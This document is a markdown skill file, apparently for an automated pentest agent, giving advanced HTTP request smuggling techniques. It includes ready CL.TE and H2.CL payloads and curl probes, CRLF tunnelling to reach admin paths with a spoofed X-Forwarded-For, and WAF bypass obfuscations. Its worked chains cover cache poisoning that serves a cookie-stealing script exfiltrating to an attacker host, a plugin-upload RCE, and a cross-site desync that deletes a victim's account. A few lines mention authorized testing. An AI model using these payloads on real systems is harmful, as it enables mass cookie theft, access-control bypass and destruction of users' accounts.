---
name: http-request-smuggling-advanced-deep
description: HTTP request smuggling at advanced+expert depth — HTTP/2 downgrade differentials with header-preservation matrices, cache-poisoning and response-queue-poisoning chain construction, WAF/CDN bypass classes, per-parser transducer differentials, and blind-confirmation methodology beyond the timing probe.
sibling: http_request_smuggling
load_when: scan_mode == "deep"
---

# HTTP Request Smuggling — Advanced Depth

This is the advanced+expert deep sibling to `http_request_smuggling.md`. The base owns the classical class taxonomy (CL.TE, TE.CL, H2.CL, H2.TE, CL.0/0.CL, CSD, pause-based desync, CONTINUATION flood), the standard detection probes, chaining routes, and the frontier-CVE routing map. The novel+frontier sibling `http_request_smuggling_novel_deep.md` owns the 2024–2026 CVE dissections and the HTTP Garden parser-differential frontier. This file owns the operational depth in between — HTTP/2-to-HTTP/1 downgrade differentials, response-queue-poisoning construction, cache-poisoning chains, WAF/CDN bypass classes, per-parser transducer differentials, harder confirmation methodology, and composite-chain construction.

Load this file when the probe hit is confirmed and the goal is either exploitation under adverse conditions (WAF in front, blind path, response queue behavior unclear) or a specific chain to durable impact (cache poisoning, cross-user capture at scale, front-end auth bypass past an admin ACL).

Every parser-behavior claim in this file is anchored to primary sources (RFC 7230/9112, HTTP/2 RFC 9113, HTTP Garden research corpus, or measured behavior on the specific runtime version). Where a claim is measured, the environment is stated inline. Where a specific CVE is referenced by name and version, the version metadata lives in the novel sibling per §2 CVE single-ownership.

## HTTP/2-to-HTTP/1 Downgrade Header-Preservation Matrix

The H2.CL and H2.TE classes depend entirely on how a specific front-end preserves HTTP/2 headers when it downgrades to HTTP/1.1 for the back-end connection. Different downgrade implementations preserve, strip, or rewrite different headers, and the specific behavior of each field decides which variant is live.

**Fields that materially affect downgrade behavior:**

- **`content-length` (regular HTTP/2 header)** — H2 disallows a Content-Length header that disagrees with the actual DATA-frame body length in principle, but many front-ends do not validate. When preserved on the downgrade, the back-end sees `Content-Length: <injected value>`. Divergence between the H2 stream's DATA length and the preserved `content-length` is the H2.CL class.
- **`transfer-encoding: chunked`** — HTTP/2 RFC 9113 § 8.2.2 explicitly forbids `transfer-encoding` in HTTP/2 requests except as `TE: trailers`. But some front-ends pass a client-supplied `transfer-encoding: chunked` through to the HTTP/1.1 back-end anyway. When they do, the back-end may prefer TE over CL, and H2.TE is live.
- **`connection: keep-alive` / `close`** — HTTP/2 forbids `connection`-related headers entirely; some front-ends still forward them, which can affect the back-end's connection-reuse behavior.
- **Header names with uppercase letters** — HTTP/2 requires lowercase; the downgrade may preserve case or normalize. Case preservation can matter when the back-end's header parser is case-sensitive for `Content-Length` vs `content-length` (rare but present in some legacy servers).
- **Duplicated headers** — HTTP/2 permits duplicated fields with the values comma-joined by the parser; the downgrade may present them as separate HTTP/1.1 header lines or as a comma-joined single line. Some back-ends handle these differently.
- **`:path` and `:authority` pseudo-header injection** — a CRLF in `:path` or `:authority` can be preserved on the downgrade into the HTTP/1.1 request line, injecting an embedded request. This is the HTTP/2 request tunnelling primitive.
- **`host` regular header** — HTTP/2 typically uses `:authority` for host; but some clients also send `host`. The downgrade decides which one lands in the HTTP/1.1 request line; a disagreement can produce host-header-differential vulnerabilities.

**Documented downgrade behavior of common front-ends (as of 2026-09-29 verification):**

| Front-end | `content-length` preserved | `transfer-encoding: chunked` preserved | CRLF in header value | CRLF in `:path`/`:authority` |
|---|---|---|---|---|
| Cloudflare | preserves in most configs | rejects the request | rejects | rejects `:path`; `:authority` depends |
| AWS ALB | preserves | preserves in classic mode; strips in modern | strips | strips |
| Nginx (h2c → h1) | preserves | preserves | preserves | preserves |
| Envoy | preserves; validates against DATA length | rejects the header | strips | strips |
| Apache mod_http2 | preserves | preserves | depends on version | depends |
| HAProxy | preserves | rejects (per current config) | strips | strips |
| Akamai (GHost) | preserves | preserves | preserves | preserves |

The matrix decides which variant to probe: H2.CL against every column with `preserves`; H2.TE only against columns where `transfer-encoding: chunked` is preserved; HTTP/2 request tunnelling against columns preserving CRLF in header values.

**Verification methodology per front-end:**

Rather than trusting the documented matrix, probe the specific target:

1. Send an H2 request with `content-length: <wrong-value>` and observe whether the downgrade preserves the wrong value (back-end error message reveals what it received).
2. Send an H2 request with `transfer-encoding: chunked` and observe whether the front-end rejects or forwards.
3. Send an H2 request with a header value containing a URL-encoded `%0d%0a` and observe whether the encoding is stripped, preserved, or triggers a rejection.
4. Send an H2 request with `:path: /foo\r\nX-Injected: yes` and observe whether the back-end sees a new header.

**Downgrade-behavior probing scripts (per specific front-end):**

For Cloudflare:
```bash
# Test if content-length preserves on downgrade
curl --http2 -X POST https://target.example/ \
  -H "content-length: 0" \
  --data-binary $'GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n' | head -20
```

For AWS ALB:
```bash
# H2.CL classic probe against ALB
curl --http2 -X POST https://target.example/ \
  -H "content-length: 4" \
  --data-binary $'GxPOST /priv HTTP/1.1\r\nHost: target.example\r\nContent-Length: 15\r\n\r\nx=1' | head
```

For each vendor, the probe should:
1. Send an H2 request with a specific injection point.
2. Include a follow-up on the same connection (or observe response shape) to detect if the injection landed.
3. Correlate the response with the specific downgrade behavior.

**Configuration options that affect downgrade posture:**

- **AWS ALB "HTTP/2 desync mitigation"** — off by default; when enabled, ALB rejects requests with duplicate or malformed CL/TE.
- **Nginx `http2_max_field_size`, `http2_max_header_size`** — affect what large headers pass through.
- **Envoy `stream_error_on_invalid_http_message`** — when true, malformed downgrades are rejected; when false, they may pass.
- **Apache `H2ModernTLSOnly`** — irrelevant to smuggling but affects fingerprinting via handshake.

Config-flag testing requires either target-config visibility (documented deployment) or black-box probing of each variant.

## Response-Queue Poisoning Construction

Response-queue poisoning is a distinct primitive from smuggled-request poisoning. The classical smuggled-request pattern poisons the socket so the back-end processes the smuggled request; response-queue poisoning misaligns which response is delivered to which pipelined client request.

**Pattern:**

Pipeline two requests over one HTTP/1.1 connection:
```
Request A (first, from attacker) — full request, but body arrives short of Content-Length
Request B (second, from attacker) — normal
```

If the back-end sends a response to Request A after processing part of the body, then reads what it thinks is the body remainder and treats it as Request B, the response queue misaligns:
- Attacker receives Response A' (which is actually the back-end's response to what it treated as Request B)
- Next client on the same connection receives Response A (which was queued for the attacker)

This is a variant of smuggling where the impact is *response misalignment* rather than request poisoning.

**Construction requires:**
- Pipelining on the HTTP/1.1 connection to the back-end.
- A back-end that doesn't strictly serialize response order per request.
- Predictable request timing (single-packet attack + Turbo Intruder).

**Confirmation:**

Send:
- Request 1: a request whose response would be uniquely identifiable (a search query with a unique string).
- Request 2: a request whose response would be different (a request to a different endpoint or with different parameters).

If the responses come back in the wrong order or one client gets the other's response, poisoning is confirmed.

**Chained impact:**
- Attacker receives another user's response — potentially containing that user's cookies, personal data, or session token if the response reflects them.
- Combined with cache poisoning, the misaligned response can be cached and served to future users.

## Cache-Poisoning Chain Construction

Smuggling that reaches a cacheable endpoint with attacker-controlled response content produces cache poisoning: the poisoned response is served to every subsequent user requesting the same cache key.

**Chain construction steps:**

1. **Identify a cacheable endpoint** — probe with `curl -I` and look for `Cache-Control: public, max-age=<n>` or CDN-cache headers (`X-Cache: HIT` on repeated fetches). Static asset paths (`/static/*`, `/assets/*`) and public API endpoints (rate-limit boundaries, marketing pages) are common candidates.
2. **Identify the cache key** — most CDN caches key on URL + `Vary` headers. Check `Vary: <header>` on responses; the cache key is `URL` * (each `Vary` header's value). If `Vary: User-Agent`, poisoning requires matching the victim's UA.
3. **Construct a smuggled request that reaches the cacheable endpoint with poisoned content**:
   ```http
   POST /some-endpoint HTTP/1.1
   Host: target.com
   Content-Length: 200
   Transfer-Encoding: chunked
   
   0
   
   GET /cacheable-path HTTP/1.1
   Host: target.com
   X-Attacker-Header-That-Reflects: <script>alert(document.domain)</script>
   Content-Length: 0
   
   ```
4. **Trigger the smuggled request to cache**: the back-end processes the smuggled `GET /cacheable-path`, generates a response that reflects `X-Attacker-Header-That-Reflects`, and the front-end caches the response (assuming the front-end caches based on origin's cache directives).
5. **Verify by fetching from a different client**: `curl https://target.com/cacheable-path` from a new source should return the poisoned response containing the XSS payload.

**Cache-key-manipulation variant:**

If the target caches on URL only (no `Vary`), a smuggled request that generates a response with a distinct URL still poisons the cache entry for that URL. This is direct.

If the target caches with `Vary: User-Agent`, the poisoned response is only served to future clients with the same UA. Match the UA of your intended victim class (mobile, specific browser).

**Chain into XSS delivery:**

The cache-poisoning primitive delivers the payload to every user who requests the poisoned URL until the cache expires. Combined with a payload that steals cookies or performs state changes, this is one of the highest-impact smuggling classes. Route to `xss.md` for the XSS payload construction; the smuggling side is confined to reaching the cache with the poisoned content.

**Cache-deception variant:**

If the target caches based on URL path but the app uses the URL for authentication (e.g., `/user/<victim-id>/profile.json`), a smuggled request can force the cache to store the victim's authenticated response under a URL the attacker can then fetch. This is web-cache deception; route to that broader class for the technique-specific catalogue.

**Cache-key normalization bypass:**

Some CDNs cache-key on normalized URLs (removing trailing slashes, uppercasing/lowercasing paths, sorting query parameters). A smuggled request that reaches the cache with a distinct case or query order may miss the cache-key check and be treated as a new entry. Probe with variations to fingerprint normalization behavior.

**Cache-poisoning through Vary manipulation:**

If the target sets `Vary: <header>` on responses, the cache is keyed on URL × Vary-header-values. Smuggling that manipulates the request headers (through injected header lines in the smuggled prefix) can create cache entries under specific Vary-value combinations that the attacker then targets specific users through.

**Cache-key extension attack:**

Some CDNs cache-key on additional URL parameters not present in the app's routing (`?utm_source=X` may or may not affect cache key). A smuggled request that adds these params may create a distinct cache entry the attacker then retrieves via URL manipulation.

**Chained cache pollution:**

Combine cache poisoning with response-queue poisoning: pipeline requests where one poisons the cache, another sends a request that triggers the poisoned entry. The chain propagates the poisoned content to more URLs over time.

**Cache-poisoning + CSP bypass:**

If the poisoned response includes an XSS payload, and the target's CSP rejects inline scripts, the payload delivery may need a CSP bypass. Route to `xss.md § CSP Bypass` for the bypass classes; the smuggling+cache combination is the delivery vector.

## WAF and CDN Bypass Classes for Smuggling

Modern WAFs and CDNs detect classical smuggling patterns; the current bypass surface is specific and per-vendor.

**Header-obfuscation classes:**

- **Non-standard TE values** — `Transfer-Encoding: xchunked`, `Transfer-Encoding: chunked, chunked`, `Transfer-Encoding:  chunked` (extra space), `Transfer-Encoding:\tchunked` (tab), each producing potentially-different WAF and back-end behavior.
- **Case variations** — `TrAnSfEr-EnCoDiNg: ChUnKeD`, `content-Length: 100`, `CoNtEnT-lEnGtH: 100`. Some WAFs are case-normalizing; some back-ends aren't.
- **Duplicate headers with WAF/back-end preference divergence** — WAF picks the first `Content-Length`, back-end picks the second, or vice versa.
- **Bare CR / LF / VT (0x0B) / FF (0x0C)** — HTTP/1.1 permits some obfuscations that specific back-ends accept but WAFs don't recognize.

**Content-Type-differential classes:**

- Some WAFs skip body inspection for specific content types (`application/octet-stream`, specific `multipart/form-data` boundary shapes); a smuggling payload sent with the skipping content type may bypass body-level WAF rules.
- Some WAFs have per-content-type parsers; a `Content-Type: application/xml` request may be routed to an XML parser that a smuggling payload embedded in it can slip through.

**Encoding-differential classes:**

- Chunked-transfer with obfuscated chunk sizes: `A;name=value` (chunk extension), `0000000A` (leading zeros — some parsers accept), `0xA` (`0x` prefix — Python `int()` accepts, others may not — the HTTP Garden Python-int class).
- URL-encoded chunk terminators inside the body — some parsers decode, others don't.

**Vendor-specific bypass patterns:**

- **Cloudflare** — historically vulnerable to specific TE-header obfuscations; verify per current ruleset. `Transfer-Encoding: chunked, X` (comma-separated) has been an evasion vector.
- **AWS WAF** — rule-based; the default managed rule set catches basic patterns; body-length limits may allow overflow bypasses.
- **Imperva** — signature-based; case-mixing bypasses are historical patterns.
- **F5 BIG-IP ASM** — positive-security-model; strict URL parameter validation but header inspection varies.
- **Akamai** — the HTTP Garden research identified specific Akamai (GHost) behaviors that produced smuggling against downstream servers.

**WAF-vs-CDN split behavior:**

When the WAF and CDN are separate layers (Cloudflare WAF + a separate origin CDN), each has its own parser. A smuggling payload that passes both must have a shape compatible with both parsers plus produces divergence at the back-end.

## Per-Parser Transducer Differentials

Beyond WAF/CDN, the composition of intermediate proxies (transducers) between the edge and the origin decides smuggling exposure. Each transducer's own parser produces divergences with the parsers around it.

**Common transducer + origin combinations and known divergences:**

- **Apache Traffic Server (ATS) + LiteSpeed** — ATS forwards specific header shapes that LiteSpeed's `strtoll`-based Content-Length parser interprets in octal (HTTP Garden finding). See `http_request_smuggling_novel_deep.md § HTTP Garden — LiteSpeed strtoll Class` for the version-specific mechanism.
- **Nghttpx + any HTTP/1.1 origin** — nghttpx's HTTP/2 handling produces specific downgrade behavior; check for the CVE-2024-28182 CONTINUATION flood surface at the same time.
- **Pound / Squid / Varnish + PHP-FPM** — historical smuggling classes have been catalogued against each of these combinations; probe per composition.
- **Google Cloud Classic ALB + any origin** — HTTP Garden identified specific Google Cloud ALB behaviors around bare-CR chunk termination that Node.js origins (pre-21.2.0) accept as smuggled request boundaries.
- **Akamai GHost + any Node.js origin** — CR forwarding as chunk-extension whitespace; same Node.js pre-21.2.0 CVE-2024-27983-adjacent class.
- **OpenBSD relayd + itself** — relayd's header-value concatenation post-CL-validation is the "single-participant" smuggling case: relayd can smuggle to relayd, no other parser needed.

**Composition fingerprinting for transducer chains:**

- Request a URL that returns a unique server header; sometimes multiple servers respond in the chain (`Via: 1.1 haproxy, 1.1 nginx`).
- Look for `X-Forwarded-*` headers with multiple IP addresses; each is a hop.
- Timing differences between HTTP methods reveal whether the front-end short-circuits (fast) or forwards (slow).
- Response header order sometimes reveals which server ordered them (Apache orders differently from Nginx from Envoy).

**Multi-hop transducer chain examples:**

- **Cloudflare → AWS ALB → Envoy → Node.js** — four parsers in sequence; each has its own smuggling posture. A payload must pass Cloudflare, ALB, Envoy, and produce back-end divergence at Node.js.
- **Akamai → Nginx (as origin edge) → HAProxy (as service mesh) → Python/Gunicorn** — the classic multi-tier enterprise architecture; each hop is a potential smuggling participant.
- **CloudFront → Fastly (as a second CDN) → Origin API gateway → back-end** — double-CDN architectures introduce complex smuggling composition.

**Detecting the exact composition:**

For each identified server layer, run a class-specific probe:
- Front-most CDN: bypass patterns from § WAF and CDN Bypass Classes.
- Reverse proxy: classical CL.TE / TE.CL probes.
- Service mesh proxy (Envoy, Linkerd): CONTINUATION-flood family + HTTP/2 downgrade class.
- Back-end app: back-end-specific parser bugs (§ Back-End-Specific Parser Behavior).

The compound impact of the chain is often greater than any single hop — a payload that appears legitimate to each of Cloudflare, ALB, and Envoy but produces smuggling at Node.js is only findable through the composition.

## Blind Confirmation Methodology

When the target's response doesn't reflect smuggled-request content (no in-response leak, no reflection), confirmation relies on out-of-band signals or side channels.

**Timing-based confirmation with statistical significance:**

- Send N control requests, N test-smuggling requests, N follow-up normal requests. Measure the follow-up response time distribution.
- The classic CL.TE / TE.CL probe with an incomplete chunk termination causes a 10-30 second delay; a single trial is noise. Ten trials with 9/10 showing the delay is a signal.
- **Single-packet attack** — Turbo Intruder's technique of sending a full HTTP request in one TCP packet removes network jitter and produces reliable timing measurements.

**Differential-response confirmation:**

- Send two pipelined requests where the second's response depends on the first. If the second returns an unexpected response (a 404 for a valid path, or content that would only appear if the first request completed with a specific state), the socket was poisoned.
- Chain: setup smuggling request → follow-up normal request on the same connection → observe the follow-up's response.

**Cache-inspection confirmation:**

- If the target has a cache, a smuggled request that reaches a cacheable endpoint can be verified by fetching from a different client (`curl` from a different IP) and observing whether the poisoned response is served.
- The cache confirmation is powerful — it demonstrates real-world impact without needing to observe the smuggled request in real-time.

**OOB-callback confirmation:**

- Smuggle a request that reaches an endpoint capable of making an outbound callback (webhook, external API call, image-fetch endpoint), and configure the outbound callback to hit `interactsh` or an equivalent OAST.
- The OAST hit confirms the smuggled request executed. Note: the callback proves the request ran; it doesn't prove impact per se (a smuggled request may run and produce no useful state change).

**Log-inspection when authorized:**

- On an authorized engagement with target-log access, examine back-end access logs for the smuggled request lines. The logs should show the smuggled request as a distinct entry, often with unusual timing (immediately after a POST that "should" have been terminal).

**Multi-probe correlation for weak signals:**

When a single probe class produces weak evidence, correlate multiple probe classes:

- CL.TE timing probe (10-30s delay).
- TE.CL timing probe (10-30s delay).
- CL.0 differential-response probe on same target.
- Cache-poisoning marker payload with unique fingerprint.

If any two of these produce reliable signals on the same target, the class is highly likely present. Single-probe hits with 5/10 reproducibility should be corroborated with a second class.

**Statistical significance for timing findings:**

For a probe that takes ~1s normally and ~11s when smuggling triggers, the p-value against null-hypothesis of random noise is very small — a single confirmed 11s response is high-confidence signal. But for probes where the delay is 1s vs 1.5s (some transducer chains), N=30+ trials with a Mann-Whitney U-test or similar produces the confidence needed.

**Reproducibility scripts:**

```bash
# CL.TE timing probe run 30 times
for i in $(seq 1 30); do
  start=$(date +%s%N)
  timeout 45 curl -X POST "https://target/" \
    -H "Content-Length: 6" \
    -H "Transfer-Encoding: chunked" \
    --data-binary $'3\r\nabc\r\nX' 2>/dev/null > /dev/null
  end=$(date +%s%N)
  echo "$((($end - $start) / 1000000)) ms"
done | sort -n
```
A distribution with a bimodal shape (fast responses clustered around normal, slow responses clustered around timeout) is strong smuggling evidence.

## HTTP/2 Request Tunnelling — Operational Depth

The base introduces HTTP/2 request tunnelling. The advanced surface is the specific injection points and the response-parsing back to the H2 stream.

**Injection points that produce a tunnelled request:**

- **`:path` with embedded CRLF** — `:path: /foo\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n`. When preserved on downgrade, the HTTP/1.1 request line contains the injected request.
- **`:authority` with embedded CRLF** — same primitive against a different pseudo-header. Some front-ends validate `:path` but not `:authority`.
- **Regular header value with embedded CRLF** — `X-Custom: value\r\nGET /admin HTTP/1.1\r\nHost: target`. Preservation varies per front-end.
- **`transfer-encoding` value with embedded CRLF** — same primitive using a header the front-end pays less attention to.

**Response mapping:**

- The tunnelled request's response is returned as part of the outer H2 stream's DATA frames. The outer H2 stream expects one response; it receives the outer response plus the tunnelled response concatenated.
- Client parsing: read the first response headers (outer), then look for a second `HTTP/1.1 <status>` line in the body — that's the tunnelled response.
- The tunnelled response contains whatever the back-end returned for the tunnelled request path. Reach `/admin` this way with no front-end auth check.

**Read primitives via tunnelling:**

- Read internal-only paths that the front-end blocks externally.
- Read cloud metadata endpoints (`http://169.254.169.254/...`) if the back-end permits.
- Read the front-end's own request-rewriting behavior (an endpoint that echoes the incoming HTTP/1.1 request reveals what the front-end sent).

**Practical tunnelling exploitation:**

The tunnelled read reveals what the front-end added to the request — typically:
- `X-Forwarded-For: <client-IP>` — reveals the front-end's view of the client IP.
- `X-Real-IP: <client-IP>` — same, different header name.
- `X-Client-Cert: <cert-info>` — mTLS-attested certificate details.
- `X-Original-URL: <original>` — the URL before front-end rewriting.
- `Via: 1.1 <proxy-id>` — the proxy identifier.
- Front-end-injected authentication headers (session tokens signed by the front-end for the back-end to verify).

Once you know what the front-end injects, you can craft a smuggled request that adds *different* values for these headers, exploiting the front-end's trust in its own additions.

**Front-end trust bypass via tunnelling:**

If the back-end trusts `X-Forwarded-For` for allowlisting (e.g., admin endpoints trust specific corporate IPs), tunnelling lets you send that header with an attacker-chosen value that bypasses the allowlist:
```
POST / HTTP/1.1
Host: target
:path: /admin\r\nX-Forwarded-For: 10.0.0.1\r\nHost: target\r\n\r\n
```
The tunnelled `/admin` request arrives at the back-end with `X-Forwarded-For: 10.0.0.1` (a trusted corporate IP), bypassing the allowlist that would have rejected the attacker's real IP.

**Tunnelling as CSRF-defense bypass:**

If the target's CSRF defense verifies an Origin header set by the front-end, a smuggled tunnelled request can inject its own Origin header that satisfies the CSRF check while performing the state change with attacker-controlled body.

## Back-End-Specific Parser Behavior

Detailed per-back-end parser quirks that decide smuggling exposure. Read the current release notes for exact patch status.

**Apache HTTP Server:**
- Historically permissive with header casing and duplicate headers.
- `mod_proxy_http` forwards headers largely unchanged to back-ends; a smuggling payload injected here reaches the back-end intact.
- HTTP/2 support via `mod_http2` — CVE-2024-27316 CONTINUATION flood was here. Verify current fix status.
- Trailer handling: `TE: trailers` support; a smuggling payload using trailer fields is possible against specific back-ends.

**Nginx:**
- Strict HTTP/1.1 parser; rejects most classical smuggling probes.
- `proxy_pass` normalization: strips duplicate `Content-Length`, normalizes case, but forwards `Transfer-Encoding` if configured to.
- No native HTTP/2 support as origin (uses `ngx_http_v2_module` as edge); most deployments use nginx as front-end only.
- Query-string byte-forwarding (per Batch-6 URL-decoder measurements): `proxy_pass` does not decode query bytes.

**Tomcat:**
- Java HTTP parser; strict RFC compliance in recent versions.
- CVE-2023-46589 HTTP trailer smuggling — trailer parsing accepted specific malformed trailer values that produced smuggling.
- AJP connector (mod_jk) has its own smuggling-adjacent CVE history (CVE-2020-1938 Ghostcat).
- HTTP/2 connector — separate parser stack; different smuggling posture.

**Envoy:**
- Strict HTTP/1.1 and HTTP/2 parsers.
- CONTINUATION flood cluster: CVE-2024-27919 + CVE-2024-30255.
- Excellent per-config observability but the config-space is large; specific configs may relax parsing.

**Node.js (llhttp):**
- Bare CR fix in 21.2.0 (llhttp 9.1.3) — the HTTP Garden Node.js class.
- CONTINUATION flood: CVE-2024-27983.
- CVE-2024-22019 (chunked-transfer resource exhaustion) — a distinct class.
- Newer llhttp releases add strict-mode by default.

**HAProxy:**
- Very strict HTTP parser historically.
- Recent versions add HTTP/2 support with dedicated parser.
- Documented conflict-resolution rules for CL+TE (reject).

**Gunicorn:**
- Python-native HTTP parser.
- CVE-2024-1135 — TE-header smuggling class.
- Async workers vs sync workers may have different parser characteristics.

**IIS:**
- Windows HTTP parser; historically permissive.
- HTTP/2 support via IIS's own stack; separate smuggling considerations.

## Version-Boundary Traps

Smuggling classes have specific version boundaries where a fix broke or reintroduced the class. Common traps:

- **Node.js pre-21.2.0** — llhttp accepted bare CR to terminate chunk lines. Fixed in 21.2.0 (llhttp 9.1.3).
- **Nginx history** — multiple smuggling-adjacent fixes across versions; check the current release notes.
- **Envoy** — CONTINUATION flood fixed at specific versions (see novel sibling for the CVE-anchored table).
- **HAProxy** — historically strong against classical smuggling; some HTTP/2 downgrade issues in specific versions.
- **Apache Traffic Server** — the HTTP Garden-identified class was patched at specific versions; verify current.
- **Tomcat HTTP trailer smuggling** — CVE-2023-46589 patched at 8.5.97 / 9.0.84 / 10.1.16 / 11.0.0-M11. Version details in `http_request_smuggling_novel_deep.md § Tomcat HTTP Trailer Handling — CVE-2023-46589`.

**The "patch at version X" trap:**

A version claimed "patched at 2.4.59" may not actually be patched if the fix was reverted, cherry-picked incompletely, or gated behind a config flag. Verify by (a) running the exploit against the claimed-patched version in a lab, or (b) reading the actual patch commit and confirming it addresses the specific class.

## First-Request-Routing Attacks

Some front-ends route an entire connection to a specific back-end based only on the first request's routing key (typically `Host` header). Subsequent requests on the same connection are forwarded to the same back-end without re-evaluating the routing key. When the routing key permits multiple values with different downstream targets, an attacker can smuggle a first request to a permitted target then reuse the connection for a restricted one.

**Pattern:**

1. Two hostnames on the target: `public.target.com` (permitted from all IPs) and `admin.target.com` (permitted from allowlist IPs only).
2. The front-end (nginx `server_name`, HAProxy `acl`, AWS ALB `Host`-based routing) routes based on `Host`.
3. Attacker sends a first request with `Host: public.target.com` — the connection is routed to the public back-end.
4. On the same connection, the attacker's second request contains `Host: admin.target.com` — the connection is already routed; the back-end proxies it to the public back-end, or the front-end re-uses the routed connection to public but the second request's `Host: admin.target.com` reaches the origin's application which handles based on Host header — the app sees `admin.target.com` and serves admin content.
5. If the origin serves admin content on a public back-end when Host matches (name-based virtual hosting), the attacker reaches admin content.

**Prerequisites:**
- Connection reuse enabled between front-end and back-end.
- Front-end routes on first request only.
- Back-end honours Host-based virtual hosting.

**Detection:**
- Send a request with `Host: public.target.com` and a request with `Host: admin.target.com` on the same TCP connection; compare responses.
- If both succeed and return different content, first-request routing is bypassable.

**Compensating controls:**
- Front-end re-validates the routing key on every request.
- Connection pool per Host key.
- Back-end enforces Host allowlist independent of connection routing.

## Connection-State Attacks

Related to first-request routing: some front-ends grant connection-level trust based on the first request's authentication state. TLS client certificate authentication is the classic example — the front-end validates the client cert once at connection establishment and grants all requests on that connection the certificate's identity.

**Attack against mTLS:**

1. Attacker establishes a TLS-mTLS connection to the front-end with a valid client cert (attacker's own).
2. Front-end forwards the connection to a back-end with the certificate's identity attached (typically as an injected header like `X-Client-Cert-Subject`).
3. Attacker smuggles requests that operate under the front-end-attested identity.
4. If the smuggled requests reach endpoints that trust the front-end's identity header, the attacker performs actions as their asserted identity but with request content the back-end would not have accepted from a direct client.

**Concrete class — mTLS + smuggling:**

A mTLS-authenticated attacker who is normally allowed limited actions can smuggle a request that reaches an admin endpoint the front-end would have blocked based on request-path allowlisting. The mTLS layer authenticated the connection; the admin allowlist checks the request path; smuggling bypasses the path check.

**Session-affinity trust:**

Some front-ends implement session affinity — routing all requests on a connection to the same back-end pool member. Combined with connection-level auth, this means the back-end trusts every request on the connection as coming from the same authenticated identity. Smuggled requests inherit that trust.

**HTTP/2 stream-level auth:**

HTTP/2 doesn't have per-connection auth in the same way; each stream is transport-independent. But front-ends may still inject connection-level auth headers uniformly across all streams on a connection.

**Detection:**

- Fingerprint mTLS presence (check for `Client Certificate` requested in TLS handshake).
- Fingerprint front-end auth-header injection (send an unauthenticated request, look for injected identity headers).
- Test smuggling with an authenticated connection and observe whether the smuggled request inherits the auth context.

**Compensating controls:**

- Back-end re-validates identity on every request (not connection-level trust).
- Per-request signed identity assertions rather than injected headers.
- Explicit connection-vs-request identity separation in the trust model.

**Related class — connection-header trust:**

Similar to mTLS: if the front-end injects `X-Real-IP` or `X-Forwarded-For` on the first request and expects the same value throughout the connection, smuggled requests can alter these headers on subsequent connection reuse. Back-ends that trust IP-based ACLs are exposed.

## WebSocket Handshake Hijacking — Deep

The base introduces WebSocket handshake hijacking. Advanced surface:

**Full hijack primitive construction:**

1. Fingerprint the target's WebSocket endpoint (`/socket`, `/ws`, `/websocket`, `/rt`).
2. Confirm the endpoint accepts `Upgrade: websocket` without an `Origin` allowlist check.
3. Smuggle an `Upgrade` request that would hijack a subsequent user's WebSocket-handshake response:
   ```http
   POST / HTTP/1.1
   Host: target.com
   Content-Length: 200
   Transfer-Encoding: chunked
   
   0
   
   GET /socket HTTP/1.1
   Host: target.com
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Version: 13
   Sec-WebSocket-Key: <attacker-key>
   
   ```
4. Next user's WebSocket-handshake request arrives on the poisoned connection; back-end may serve the attacker's Upgrade response to the user, or vice versa.
5. The attacker's socket receives frames intended for the victim (chat messages, notifications, tokens pushed over the socket).

**Persistence:**

If the hijacked socket carries a session token in an early message (some apps push a JWT after handshake), the attacker captures the token and can then open independent authenticated sessions.

**Note:** modern WebSocket implementations often disable connection reuse for Upgrade requests specifically — the class is narrower than a decade ago but still present in specific stacks.

## Composite Chain — CL.TE + Cache Poisoning → Mass XSS

Worked example:

1. Fingerprint: Cloudflare in front of Apache. Cloudflare caches `/marketing/*` with `max-age=3600`.
2. Confirm CL.TE against Apache via a timing probe: `POST /marketing/campaign HTTP/1.1` with `Content-Length: 6` + `Transfer-Encoding: chunked` + incomplete chunk. Apache waits for chunk terminator; timeout confirms.
3. Construct the smuggled prefix:
   ```http
   POST /marketing/campaign HTTP/1.1
   Host: target.com
   Content-Length: 200
   Transfer-Encoding: chunked
   
   0
   
   GET /marketing/faq HTTP/1.1
   Host: target.com
   X-Custom-Reflected: <script>fetch('//attacker/'+document.cookie)</script>
   Content-Length: 0
   
   ```
4. `/marketing/faq` is a cacheable endpoint that echoes the `X-Custom-Reflected` header into its response body (found via source review or probe).
5. Cloudflare caches the poisoned response for `/marketing/faq`.
6. All subsequent users fetching `/marketing/faq` receive the XSS payload; their cookies exfiltrate to `attacker`.
7. Chain: smuggling (this file) → cache (this section) → XSS delivery (`xss.md`).

## Composite Chain — H2.CL + Admin API Reach → RCE via Plugin Upload

Worked example:

1. Fingerprint: AWS ALB (HTTP/2) in front of Node.js (HTTP/1.1). The `content-length` header downgrades from H2 to H1 preserving the injected value.
2. Confirm H2.CL: send an H2 request with `content-length: 0` and a DATA-frame body containing a smuggled request. Back-end processes the smuggled request.
3. Admin plugin API (`/admin/plugins/upload`) requires authentication at the ALB layer; smuggling bypasses the ALB check.
4. Smuggle a POST to `/admin/plugins/upload` with a malicious plugin JAR body.
5. Access the uploaded plugin via `/plugins/<name>/entry` — RCE via the plugin's execution.
6. Chain: smuggling → auth bypass → plugin upload → `rce.md`.

## Composite Chain — CSD → Victim State Change

Worked example:

1. Target: single-server web app (no front-end); CL.0 confirmed on a specific endpoint (`/api/log`) that ignores body.
2. Attacker page (hosted on `evil.tld`) issues a browser-legal cross-origin `fetch` to `https://target/api/log` with a body that is a full smuggled request performing a state change on `/account/delete`.
3. Victim visits attacker page; browser opens keep-alive connection to `target`, sends the fetch, then the victim navigates to `https://target/` for the natural next request.
4. Same connection is reused; the smuggled `POST /account/delete` prefixes the victim's next same-origin navigation.
5. Victim's account is deleted with their credentials.
6. Chain: CSD (this file) → state change (`csrf.md`-adjacent impact, but attacker page trigger differs).

## Detection Discipline — Signal Reproducibility

Every smuggling finding has to survive the "run it again" test. Detection discipline is what separates real findings from load-balancer-round-robin timing noise.

**Reproducibility criteria:**

- **N ≥ 10 trials, ≥ 8/10 success rate** — a single hit isn't a finding. Timing-based probes require multiple trials to establish signal above noise.
- **Distinct source IP for verification** — reproduce the finding from a different source to rule out per-connection state.
- **Distinct timing windows** — reproduce during peak-traffic and off-peak; a finding that only reproduces in one window may be load-balancer-behavior-dependent.
- **Distinct front-end pool member** — CDNs often have multiple pool members per region; a finding against one member may not reproduce against another. Verify the exact `CF-RAY` or equivalent pool-member identifier.

**Signal-vs-noise separators:**

- **CL.TE / TE.CL timing**: delay must be consistent (10-30 seconds against unclosed chunk); a sub-second delay is not a signal.
